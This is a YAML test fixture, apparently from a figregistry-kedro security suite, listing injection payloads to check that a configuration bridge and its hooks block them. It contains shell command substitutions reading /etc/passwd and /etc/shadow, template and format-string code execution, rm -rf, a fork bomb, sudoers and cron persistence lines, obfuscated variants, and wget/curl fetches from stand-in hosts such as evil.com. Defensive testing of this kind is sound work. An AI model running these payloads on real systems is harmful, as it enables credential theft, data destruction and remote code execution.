# Environment Variable Exploitation Test Configuration
# 
# This malicious configuration file tests FigRegistryConfigBridge and FigRegistryHooks
# protection against unauthorized environment variable access, system configuration
# manipulation, and privilege escalation through environment variable injection.
#
# Test Coverage Areas (Section 6.6.8.3):
# - Environment variable protection and system configuration security
# - Prevention of privilege escalation through environment variable manipulation  
# - Protection against configuration template injection and variable expansion attacks
# - Comprehensive system security boundary enforcement against environment exploitation
#
# Attack Vectors Tested:
# 1. Environment variable injection through YAML configuration loading
# 2. System configuration tampering via environment variable override
# 3. Privilege escalation through environment variable manipulation
# 4. Configuration bridge exploitation targeting variable expansion
# 5. Template injection vectors through environment variable substitution
# 6. System configuration manipulation through environment variable injection

# CRITICAL: This file contains intentionally malicious configuration patterns
# designed to test security controls. DO NOT use in production environments.

metadata:
  test_type: "security_environment_variable_exploitation"
  description: "Malicious configuration testing environment variable manipulation and system security"
  security_classification: "DANGEROUS - TESTING ONLY"
  created_by: "figregistry-kedro security test suite"
  test_vectors: "environment_variable_injection, privilege_escalation, system_tampering"

# =============================================================================
# ENVIRONMENT VARIABLE INJECTION ATTACK VECTORS
# =============================================================================

# Test 1: Direct Environment Variable Override Attempts
# Attempts to override critical system environment variables through configuration
environment_variable_override_attacks:
  # Attempt to override PATH for privilege escalation
  malicious_path_override:
    base_path: "${PATH}/../malicious_scripts"
    backup_path: "$PATH:/tmp/malicious:/usr/local/malicious"
    
  # Attempt to override HOME directory for unauthorized access
  home_directory_manipulation:
    user_home: "${HOME}/../../../root"
    config_home: "$HOME/.ssh:$HOME/.aws:$HOME/.kube"
    
  # Attempt to override system configuration directories
  system_config_tampering:
    system_path: "${SYSTEMROOT}/system32"
    config_path: "/etc/passwd:/etc/shadow:/etc/sudoers"
    
  # Attempt library path manipulation for code injection
  library_path_injection:
    lib_path: "${LD_LIBRARY_PATH}:/tmp/malicious_libs"
    python_path: "${PYTHONPATH}:/tmp/python_exploits"

# Test 2: Environment Variable Expansion Exploitation
# Tests for vulnerabilities in environment variable expansion during configuration processing
environment_expansion_exploits:
  # Command injection through environment variable expansion
  command_injection_attempts:
    # Attempt shell command execution through variable expansion
    shell_command: "$(whoami > /tmp/exploit_proof.txt)"
    system_command: "${shell:cat /etc/passwd}"
    process_substitution: "$(<(echo 'malicious_payload'))"
    
  # Environment variable chaining for privilege escalation
  variable_chaining_exploits:
    # Chain environment variables to access restricted areas
    chained_access: "${USER}:${SUDO_USER}:${LOGNAME}"
    privilege_chain: "${SUDO_GID}:${SUDO_UID}:${SUDO_COMMAND}"
    
  # File system traversal through environment variables
  filesystem_traversal:
    # Attempt directory traversal using environment variables
    traversal_path: "${PWD}/../../../etc"
    root_access: "${HOME}/../../../root/.ssh"

# Test 3: Configuration Template Injection Vectors
# Tests protection against template injection and variable substitution attacks
template_injection_exploits:
  # Jinja2-style template injection attempts
  jinja_injection_attempts:
    malicious_template: "{{ __import__('os').system('id > /tmp/template_exploit') }}"
    code_execution: "{% set x = __import__('subprocess').call(['whoami']) %}"
    
  # Python format string injection
  format_string_injection:
    format_exploit: "{os.system('ls -la /etc > /tmp/format_exploit')}"
    eval_injection: "{eval('__import__(\"os\").system(\"id\")')}"
    
  # YAML anchor and reference exploitation
  yaml_anchor_exploits:
    # Attempt to create malicious YAML anchors
    anchor_definition: &malicious_anchor
      command: "rm -rf /tmp/*"
      system_call: "cat /etc/shadow"
    anchor_reference: *malicious_anchor

# =============================================================================
# SYSTEM CONFIGURATION TAMPERING ATTACK VECTORS  
# =============================================================================

# Test 4: System Configuration Manipulation Through Environment Variables
system_configuration_attacks:
  # Attempt to manipulate system configuration files
  config_file_manipulation:
    # Target critical system configuration files
    hosts_file: "${WINDIR}/system32/drivers/etc/hosts"
    resolv_conf: "/etc/resolv.conf"
    ssh_config: "/etc/ssh/sshd_config"
    
  # Registry manipulation attempts (Windows)
  registry_manipulation:
    registry_key: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    registry_value: "malicious_autostart"
    
  # Service configuration tampering
  service_tampering:
    service_path: "/etc/systemd/system"
    service_name: "malicious_service.service"

# Test 5: Privilege Escalation Through Configuration
privilege_escalation_attacks:
  # Attempt to escalate privileges through configuration manipulation
  sudo_exploitation:
    # Attempt to manipulate sudo configuration
    sudoers_file: "/etc/sudoers"
    sudo_command: "ALL=(ALL) NOPASSWD: ALL"
    
  # SUID/SGID exploitation attempts
  suid_exploitation:
    suid_binary: "/usr/bin/sudo"
    sgid_binary: "/usr/bin/wall"
    
  # Process environment manipulation
  process_manipulation:
    # Attempt to manipulate process environment
    proc_environ: "/proc/self/environ"
    proc_cmdline: "/proc/self/cmdline"

# =============================================================================
# KEDRO INTEGRATION SPECIFIC ATTACK VECTORS
# =============================================================================

# Test 6: FigRegistryConfigBridge Exploitation Attempts
config_bridge_exploits:
  # Target configuration merging process
  merge_exploitation:
    # Attempt to inject malicious data during configuration merging
    kedro_override: 
      parameters:
        malicious_param: "${shell:rm -rf /tmp/*}"
        exploit_condition: "$(cat /etc/passwd)"
    figregistry_override:
      styles:
        exploit_style:
          color: "${env:SHELL}/../../bin/sh"
          command: "$(id > /tmp/bridge_exploit)"
  
  # Environment-specific configuration exploitation
  environment_specific_exploits:
    local:
      base_path: "${HOME}/../../../etc"
      output_path: "/tmp/malicious_output"
    production:
      base_path: "${SYSTEMROOT}/system32"
      backup_path: "/etc/passwd"
    staging:
      test_path: "$(whoami > /tmp/staging_exploit)"
      exploit_var: "${PATH}:$(cat /etc/shadow)"

# Test 7: FigRegistryHooks Lifecycle Exploitation
hooks_lifecycle_exploits:
  # Target hook initialization process
  initialization_exploits:
    # Attempt to exploit hook initialization
    hook_config:
      after_config_loaded:
        exploit_command: "$(touch /tmp/hook_exploit)"
        malicious_path: "${HOME}/../../../root"
      before_pipeline_run:
        system_command: "${shell:cat /etc/passwd > /tmp/pipeline_exploit}"
        env_manipulation: "${PATH}:/tmp/malicious_hooks"
      after_pipeline_run:
        cleanup_exploit: "$(rm -rf /tmp/* 2>/dev/null || true)"
        
  # Context management exploitation
  context_exploitation:
    # Attempt to exploit context management
    context_config:
      project_context: "${PWD}/../../../etc"
      active_contexts: "$(ps aux > /tmp/context_exploit)"
      performance_metrics: "${shell:netstat -tulpn > /tmp/network_info}"

# =============================================================================
# ADVANCED ENVIRONMENT VARIABLE EXPLOITATION TECHNIQUES
# =============================================================================

# Test 8: Advanced Environment Variable Injection Patterns
advanced_injection_patterns:
  # Multi-level environment variable nesting
  nested_injection:
    level1: "${${USER}_HOME}"
    level2: "${${USER}_${HOSTNAME}_CONFIG}"
    level3: "${${SHELL}_${PWD}_${HOME}}"
    
  # Conditional environment variable expansion
  conditional_expansion:
    condition1: "${USER:+/tmp/exploit_if_user_set}"
    condition2: "${UNDEFINED_VAR:-$(cat /etc/passwd)}"
    condition3: "${PATH:?Error: $(whoami > /tmp/error_exploit)}"
    
  # Environment variable arithmetic expansion
  arithmetic_exploits:
    # Bash arithmetic expansion attempts
    arithmetic1: "$(($(id -u) * 1000))"
    arithmetic2: "$[$(cat /etc/passwd | wc -l)]"

# Test 9: Configuration Validation Bypass Attempts
validation_bypass_exploits:
  # Attempt to bypass Pydantic validation
  pydantic_bypass:
    # Malformed data designed to bypass validation
    invalid_type: "not_a_dict_but_should_be"
    none_injection: null
    empty_exploit: ""
    
  # Schema validation exploitation
  schema_exploits:
    # Attempt to exploit schema validation
    extra_fields:
      __class__: "malicious_class"
      __module__: "os"
      __dict__: {"system": "whoami"}
    
  # Type coercion exploitation
  type_coercion_exploits:
    # Attempt to exploit type coercion
    string_to_code: "exec('import os; os.system(\"id\")')"
    number_to_command: 0x2f2f2f  # Potential overflow

# =============================================================================
# FILE SYSTEM AND PATH MANIPULATION ATTACKS
# =============================================================================

# Test 10: File System Security Boundary Violations
filesystem_boundary_violations:
  # Path traversal through configuration
  path_traversal_attacks:
    # Directory traversal attempts
    relative_traversal: "../../../../etc/passwd"
    absolute_traversal: "/etc/shadow"
    null_byte_injection: "/tmp/safe\x00../../../etc/passwd"
    
  # Symlink exploitation attempts
  symlink_exploits:
    # Symbolic link attacks
    symlink_target: "/tmp/symlink_to_etc"
    symlink_chain: "/tmp/link1 -> /tmp/link2 -> /etc/passwd"
    
  # File permission manipulation
  permission_attacks:
    # Attempt to create files with dangerous permissions
    world_writable: "/tmp/world_writable_config"
    suid_attempt: "/tmp/potential_suid_file"

# =============================================================================
# CONFIGURATION SOURCE EXPLOITATION
# =============================================================================

# Test 11: Multi-Source Configuration Exploitation
multi_source_exploits:
  # Exploit configuration precedence rules
  precedence_exploitation:
    # Attempt to exploit configuration merging precedence
    kedro_source:
      malicious_override: "$(cat /etc/passwd)"
      system_exploit: "${SHELL} -c 'id > /tmp/precedence_exploit'"
    figregistry_source:
      backup_exploit: "/etc/shadow"
      fallback_command: "$(whoami)"
      
  # Configuration inheritance exploitation
  inheritance_exploits:
    # Attempt to exploit style inheritance
    parent_style: &parent
      command: "$(touch /tmp/inheritance_exploit)"
      system_call: "${shell:cat /etc/hosts}"
    child_style:
      <<: *parent
      additional_exploit: "$(ls -la /root)"

# =============================================================================
# RUNTIME EXPLOITATION ATTEMPTS
# =============================================================================

# Test 12: Runtime Environment Manipulation
runtime_exploitation:
  # Process environment manipulation during execution
  process_env_manipulation:
    # Attempt to manipulate process environment at runtime
    runtime_path: "${PATH}:/tmp/runtime_malicious"
    runtime_home: "${HOME}/../../../tmp"
    runtime_shell: "${SHELL} -c 'cat /etc/passwd'"
    
  # Memory and resource exploitation
  resource_exploitation:
    # Attempt resource exhaustion or memory exploitation
    memory_bomb: "${PATH}${PATH}${PATH}${PATH}${PATH}${PATH}${PATH}${PATH}"
    fork_bomb_attempt: "$(:(){ :|:& };:)"
    
  # Signal and process manipulation
  signal_exploitation:
    # Attempt signal manipulation
    signal_kill: "$(kill -9 $$)"
    signal_stop: "$(kill -STOP $$)"

# =============================================================================
# NETWORK AND EXTERNAL ACCESS ATTEMPTS
# =============================================================================

# Test 13: External Access and Network Exploitation
external_access_attempts:
  # Network access attempts (should be blocked)
  network_exploitation:
    # Attempt external network access
    wget_attempt: "$(wget http://malicious.example.com/exploit.sh -O /tmp/exploit.sh)"
    curl_attempt: "$(curl -o /tmp/malicious http://evil.com/payload)"
    nc_attempt: "$(nc -l 1337 < /etc/passwd)"
    
  # DNS manipulation attempts
  dns_manipulation:
    # Attempt DNS configuration manipulation
    hosts_manipulation: "127.0.0.1 malicious.local"
    dns_server: "8.8.8.8:$(cat /etc/passwd)"

# =============================================================================
# PAYLOAD DELIVERY AND PERSISTENCE MECHANISMS
# =============================================================================

# Test 14: Payload Delivery Through Configuration
payload_delivery_mechanisms:
  # File creation and persistence
  file_creation_exploits:
    # Attempt to create persistent malicious files
    cron_job: "* * * * * root /tmp/malicious_script.sh"
    bashrc_injection: "echo 'malicious_command' >> ~/.bashrc"
    profile_injection: "$(echo 'export MALICIOUS=1' >> ~/.profile)"
    
  # Binary and script deployment
  binary_deployment:
    # Attempt to deploy malicious binaries
    binary_path: "/tmp/malicious_binary"
    script_path: "/tmp/exploit_script.sh"
    payload_url: "http://malicious.example.com/payload"

# =============================================================================
# CONFIGURATION SPECIFIC SECURITY TESTS
# =============================================================================

# Test 15: FigRegistry-Specific Security Vulnerabilities
figregistry_specific_exploits:
  # Style definition exploitation
  style_exploits:
    malicious_style:
      # Attempt to inject code through style definitions
      color: "$(cat /etc/passwd)"
      marker: "${shell:whoami}"
      linewidth: "$(id -u)"
      label: "$(uname -a > /tmp/style_exploit)"
      
  # Output path manipulation
  output_exploits:
    # Attempt to manipulate output paths for unauthorized access
    base_path: "../../../../etc"
    naming_template: "{name}_{condition}_{$(whoami)}"
    format_exploits:
      png: "$(touch /tmp/png_exploit)"
      pdf: "${shell:cat /etc/shadow > /tmp/pdf_exploit}"
      
  # Condition parameter exploitation
  condition_exploits:
    # Attempt to exploit condition parameters
    condition_param: "$(cat /etc/passwd)"
    style_params:
      malicious_param: "${shell:id > /tmp/condition_exploit}"
      system_param: "$(uname -a)"

# =============================================================================
# DEFENSIVE EVASION TECHNIQUES
# =============================================================================

# Test 16: Security Control Evasion Attempts
evasion_techniques:
  # Encoding and obfuscation attempts
  obfuscation_attempts:
    # Various encoding techniques to evade detection
    base64_encoded: "JChjYXQgL2V0Yy9wYXNzd2Qp"  # $(cat /etc/passwd)
    hex_encoded: "\x24\x28\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x29"
    unicode_encoded: "\u0024\u0028\u0063\u0061\u0074\u0020\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064\u0029"
    
  # Whitespace and special character evasion
  whitespace_evasion:
    # Use of whitespace and special characters to evade detection
    tab_injection: "$(cat\t/etc/passwd)"
    newline_injection: "$(cat\n/etc/passwd)"
    null_byte: "$(cat\x00/etc/passwd)"
    
  # Case variation and mixed encoding
  case_evasion:
    # Case variations to evade simple pattern matching
    mixed_case: "$(CaT /EtC/pAsSwD)"
    alternating: "$(cAt /EtC/pAsSwD)"

# =============================================================================
# METADATA AND TEST CONFIGURATION
# =============================================================================

# Test execution metadata
test_execution_metadata:
  test_categories:
    - "environment_variable_injection"
    - "system_configuration_tampering" 
    - "privilege_escalation_attempts"
    - "configuration_template_injection"
    - "variable_expansion_exploitation"
    - "security_boundary_violations"
    - "filesystem_security_attacks"
    - "runtime_environment_manipulation"
    - "network_access_attempts"
    - "payload_delivery_mechanisms"
    - "figregistry_specific_exploits"
    - "security_control_evasion"
    
  expected_security_controls:
    - "YAML safe loading prevents code execution"
    - "Environment variable access is restricted"
    - "Configuration validation blocks malicious input"
    - "File system access respects permissions"
    - "Network access is completely disabled"
    - "Process environment is isolated"
    - "Configuration bridge validates all inputs"
    - "Hook lifecycle maintains security boundaries"
    
  validation_requirements:
    - "All malicious patterns should be detected and blocked"
    - "No environment variable manipulation should succeed"
    - "No unauthorized file system access should occur"
    - "No privilege escalation should be possible"
    - "All injection attempts should fail safely"
    - "System configuration should remain untampered"
    - "Security boundaries should be enforced comprehensively"

# CRITICAL SECURITY NOTICE:
# This configuration file contains intentionally malicious patterns designed
# to test security controls. The FigRegistryConfigBridge and FigRegistryHooks
# components must block ALL of these attack vectors to pass security validation.
# Any successful exploitation indicates a critical security vulnerability
# that must be addressed immediately.